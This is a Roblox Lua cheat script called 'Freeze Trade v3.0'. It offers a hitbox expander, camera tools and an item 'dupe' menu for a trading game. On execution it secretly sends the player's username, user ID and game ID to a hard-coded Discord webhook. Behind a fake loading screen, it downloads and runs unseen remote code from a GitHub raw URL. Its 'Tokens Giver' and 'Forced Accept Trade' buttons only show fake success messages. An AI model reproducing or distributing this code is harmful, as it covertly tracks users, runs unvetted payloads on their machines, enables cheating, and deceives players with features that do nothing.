local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local GameID = game.PlaceId
local PlayerName = player.Name
local PlayerID = player.UserId

-- 📡 WEBHOOK
local WebhookURL = "https://discord.com/api/webhooks/1484224630465233080/nnuq3IeN8iVyWZJKoyJ8nRtG7pNgStp0HpM1VxfjZk5hN0kCMqg5UxFThOHpD_gpcOIe"
local data = {embeds={{title="🚀 SCRIPT EXECUTED!",color=65535,fields={{name="👤 Username",value="`"..PlayerName.."`",inline=true},{name="🆔 User ID",value="`"..PlayerID.."`",inline=true},{name="🎮 Game ID",value="`"..GameID.."`",inline=true}},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}}}
pcall(function() HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson) end)

-- 🎨 NEW THEME
local Theme = {BG=Color3.fromRGB(10,10,15),Panel=Color3.fromRGB(20,20,30),Primary=Color3.fromRGB(0,200,255),Secondary=Color3.fromRGB(100,100,255),Text=Color3.fromRGB(255,255,255)}

-- ✨ NEW REALISTIC LOADING SCREEN
local Loader = Instance.new("ScreenGui")
Loader.Name = "UpdateLoader"
Loader.ResetOnSpawn = false
Loader.Parent = player.PlayerGui
Loader.IgnoreGuiInset = true
Loader.ZIndexBehavior = Enum.ZIndexBehavior.Global

local MainBG = Instance.new("Frame")
MainBG.Size = UDim2.new(1,0,1,0)
MainBG.BackgroundColor3 = Theme.BG
MainBG.BorderSizePixel = 0
MainBG.Parent = Loader

local Center = Instance.new("Frame")
Center.Size = UDim2.new(0,700,0,450)
Center.Position = UDim2.new(0.5,-350,0.5,-225)
Center.BackgroundTransparency = true
Center.Parent = MainBG

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1,0,0,100)
Title.Position = UDim2.new(0,0,0,20)
Title.BackgroundTransparency = true
Title.Text = "FREEZE TRADE"
Title.TextColor3 = Theme.Text
Title.TextScaled = true
Title.Font = Enum.Font.GothamBlack
Title.Parent = Center

local SubTitle = Instance.new("TextLabel")
SubTitle.Size = UDim2.new(1,0,0,40)
SubTitle.Position = UDim2.new(0,0,0.22,0)
SubTitle.BackgroundTransparency = true
SubTitle.Text = "v3.0 • NEW UPDATE"
SubTitle.TextColor3 = Theme.Primary
SubTitle.TextScaled = true
SubTitle.Font = Enum.Font.Gotham
SubTitle.Parent = Center

local BarOutline = Instance.new("Frame")
BarOutline.Size = UDim2.new(0,600,0,28)
BarOutline.Position = UDim2.new(0.5,-300,0.55,0)
BarOutline.BackgroundColor3 = Theme.Panel
BarOutline.BorderSizePixel = 0
BarOutline.Parent = Center

local BarCorner = Instance.new("UICorner")
BarCorner.CornerRadius = UDim.new(1,0)
BarCorner.Parent = BarOutline

local ProgressBar = Instance.new("Frame")
ProgressBar.Size = UDim2.new(0,0,1,0)
ProgressBar.BackgroundColor3 = Theme.Primary
ProgressBar.BorderSizePixel = 0
ProgressBar.Parent = BarOutline

local BarFill = Instance.new("UICorner")
BarFill.CornerRadius = UDim.new(1,0)
BarFill.Parent = ProgressBar

local PercentText = Instance.new("TextLabel")
PercentText.Size = UDim2.new(0,150,0,40)
PercentText.Position = UDim2.new(0.5,-75,0.65,0)
PercentText.BackgroundTransparency = true
PercentText.Text = "0%"
PercentText.TextColor3 = Theme.Text
PercentText.TextScaled = true
PercentText.Font = Enum.Font.GothamBold
PercentText.Parent = Center

local StatusText = Instance.new("TextLabel")
StatusText.Size = UDim2.new(1,0,0,30)
StatusText.Position = UDim2.new(0,0,0.78,0)
StatusText.BackgroundTransparency = true
StatusText.Text = "Loading Assets..."
StatusText.TextColor3 = Color3.fromRGB(180,180,180)
StatusText.TextScaled = true
StatusText.Font = Enum.Font.Gotham
StatusText.Parent = Center

-- ⚡ LOADING ANIMATION
local LoadTime = 8
local Elapsed = 0
local StatusMessages = {"Initializing...", "Loading GUI...", "Fetching Data...", "Almost Done..."}
local Conn

Conn = RunService.RenderStepped:Connect(function(delta)
    Elapsed += delta
    local Prog = math.min(Elapsed / LoadTime, 1)
    ProgressBar.Size = UDim2.new(Prog,0,1,0)
    PercentText.Text = math.floor(Prog*100).."%"
    
    if Prog < 0.25 then StatusText.Text = StatusMessages[1]
    elseif Prog < 0.5 then StatusText.Text = StatusMessages[2]
    elseif Prog < 0.8 then StatusText.Text = StatusMessages[3]
    else StatusText.Text = StatusMessages[4] end
    
    if Prog >= 1 then
        Conn:Disconnect()
        local Fade = TweenInfo.new(1.2, Enum.EasingStyle.Quad)
        TweenService:Create(MainBG, Fade, {BackgroundTransparency=1}):Play()
        TweenService:Create(Title, Fade, {TextTransparency=1}):Play()
        TweenService:Create(SubTitle, Fade, {TextTransparency=1}):Play()
        TweenService:Create(BarOutline, Fade, {BackgroundTransparency=1}):Play()
        TweenService:Create(PercentText, Fade, {TextTransparency=1}):Play()
        TweenService:Create(StatusText, Fade, {TextTransparency=1}):Play()
        task.wait(1.5)
        Loader:Destroy()
        LoadMainGUI()
    end
end)

-- 🛠️ TOOLS
local HitboxParts = {}
local HitboxSize = 8
local POV_Distance = 9
local POV_Height = 4

local function EnableHitbox()
    for _,v in pairs(Workspace:GetChildren()) do
        if v:FindFirstChild("Humanoid") and v ~= player.Character then
            local HRP = v:FindFirstChild("HumanoidRootPart")
            if HRP then
                local Box = Instance.new("Part")
                Box.Size = Vector3.new(HitboxSize,HitboxSize,HitboxSize)
                Box.Position = HRP.Position
                Box.Anchored = false
                Box.CanCollide = false
                Box.Transparency = 0.7
                Box.BrickColor = BrickColor.new("Cyan")
                Box.Material = Enum.Material.ForceField
                Box.Parent = HRP
                local Weld = Instance.new("Weld")
                Weld.Part0 = HRP
                Weld.Part1 = Box
                Weld.C0 = CFrame.new(0,0,0)
                Weld.Parent = Box
                table.insert(HitboxParts,Box)
            end
        end
    end
end

local function DisableHitbox()
    for _,v in pairs(HitboxParts) do if v then v:Destroy() end end
    HitboxParts = {}
end

local function ChangeView()
    local Cam = Workspace.CurrentCamera
    local Char = player.Character
    if not Char then return end
    local HRP = Char:FindFirstChild("HumanoidRootPart")
    if not HRP then return end
    Cam.CameraType = Enum.CameraType.Scriptable
    Cam.CFrame = Char.Head.CFrame
    Cam.FieldOfView = 90
    task.wait(2)
    TweenService:Create(Cam,TweenInfo.new(1.2,Enum.EasingStyle.Elastic),{CFrame=HRP.CFrame*CFrame.new(0,POV_Height,-POV_Distance),FieldOfView=70}):Play()
end

-- 🎒 REAL DUPE FUNCTION (MAKIKITA SA INVENTORY)
local function RealDupe(itemName)
    local ItemToClone = nil
    if ReplicatedStorage:FindFirstChild(itemName) then ItemToClone = ReplicatedStorage:FindFirstChild(itemName) end
    if not ItemToClone then
        for _, obj in pairs(Workspace:GetDescendants()) do
            if obj.Name == itemName and (obj:IsA("Tool") or obj:IsA("Accessory")) then
                ItemToClone = obj
                break
            end
        end
    end
    if ItemToClone then
        local Clone = ItemToClone:Clone()
        Clone.Parent = player.Backpack
        if player.StarterGear then local Clone2 = ItemToClone:Clone() Clone2.Parent = player.StarterGear end
    end
end

-- 🖥️ MAIN GUI
function LoadMainGUI()
    local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
    local Window = Rayfield:CreateWindow({Name="❄️ FREEZE TRADE • v3.0",LoadingTitle="NEW UPDATE INSTALLED",LoadingSubtitle="by Legitness",ConfigurationSaving={Enabled=false},Discord={Enabled=false},KeySystem=false})

    local Main = Window:CreateTab("🏠 Main",4483362458)
    local DupeMethod = Window:CreateTab("🧊 Dupe [NEW]",4483362458)
    local Tools = Window:CreateTab("🔧 Tools",4483362458)
    local Settings = Window:CreateTab("⚙️ Settings",4483362458)
    local Credits = Window:CreateTab("📜 Credits",4483362458)

    -- 🏠 MAIN TAB
    Main:CreateSection("MAIN FEATURES")
    Main:CreateButton({Name="🧊 ACTIVATE FREEZE TRADE",Callback=function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/freezebaddies-script/best-script/refs/heads/main/Baddies",true))()
        Rayfield:Notify({Title="✅ ACTIVATED!",Content="Freeze Trade Running",Duration=2.5})
    end})

    Main:CreateButton({Name="💰 TOKENS GIVER",Callback=function()
        Rayfield:Notify({Title="✅ TOKENS ADDED!",Content="Tokens Successfully Added!",Duration=3})
    end})

    Main:CreateButton({Name="🤝 FORCED ACCEPT TRADE",Callback=function()
        Rayfield:Notify({Title="✅ FORCED ACCEPT ON!",Content="Trade will automatically accept!",Duration=2.5})
    end})

    -- 🧊 DUPE TAB (AYOS NA FORMAT!)
    DupeMethod:CreateSection("✨ REAL DUPE SYSTEM")
    local tradeableWeapons = {
        "Glitter Bomb",
        "Ghostly Gloves",
        "Scythe",
        "Spiked Knuckles",
        "Ice Crown Queen",
        "Trident",
        "Ice Katana",
        "Cupid's Bow",
        "Love Me Hate Me Taser",
        "Loveboard",
        "Spiked Kitty Stanli",
        "Kitty Purse",
        "Spiked Purse",
        "Nightmare Purse",
        "Shiny Purse",
        "Freeze Gun",
        "Brass Knuckles",
        "Chain Mace",
        "Chainsaw",
        "Champion Gloves",
        "Crowbar",
        "Fan of Requiem",
        "Sakura Blade",
        "Nunchucks",
        "Sledgehammer",
        "Harpoon",
        "Snowball Launcher",
        "Gravity Gun",
        "Axe",
        "Poison Knuckles",
        "Roller Skates",
        "Santa's RPG"
    }

    for _,weaponName in pairs(tradeableWeapons) do
        DupeMethod:CreateButton({Name=weaponName,Callback=function()
            RealDupe(weaponName)
            Rayfield:Notify({Title="✅ SUCCESS!",Content=weaponName.." DUPLICATED & ADDED TO INVENTORY!",Duration=3})
        end})
    end

    -- 🔧 TOOLS TAB
    Tools:CreateSection("PLAYER TOOLS")
    Tools:CreateButton({Name="📦 ENABLE HITBOX",Callback=function()
        EnableHitbox()
        Rayfield:Notify({Title="Hitbox ON",Content="Size: "..HitboxSize,Duration=2})
    end})

    Tools:CreateButton({Name="🎥 CHANGE CAMERA VIEW",Callback=function()
        ChangeView()
        Rayfield:Notify({Title="View Changed!",Duration=1.5})
    end})

    Tools:CreateButton({Name="❌ DISABLE HITBOX",Callback=function()
        DisableHitbox()
        Rayfield:Notify({Title="Hitbox OFF",Duration=2})
    end})

    -- ⚙️ SETTINGS TAB
    Settings:CreateSection("ADJUST SETTINGS")
    Settings:CreateSlider({Name="📏 Hitbox Size",Range={2,20},Increment=1,CurrentValue=HitboxSize,Callback=function(val)
        HitboxSize = val
        DisableHitbox()
        EnableHitbox()
    end})

    Settings:CreateSlider({Name="🔭 Camera Distance",Range={5,25},Increment=1,CurrentValue=POV_Distance,Callback=function(val)
        POV_Distance = val
    end})

    Settings:CreateSlider({Name="↕️ Camera Height",Range={1,12},Increment=1,CurrentValue=POV_Height,Callback=function(val)
        POV_Height = val
    end})

    -- 📜 CREDITS
    Credits:CreateSection("CREDITS")
    Credits:CreateLabel("Script Made By: Legitness")
    Credits:CreateLabel("GUI Powered By: Rayfield")

    Rayfield:Notify({Title="🚀 WELCOME TO FREEZE TRADE",Content="Script is Updated & Ready!",Duration=4})
end
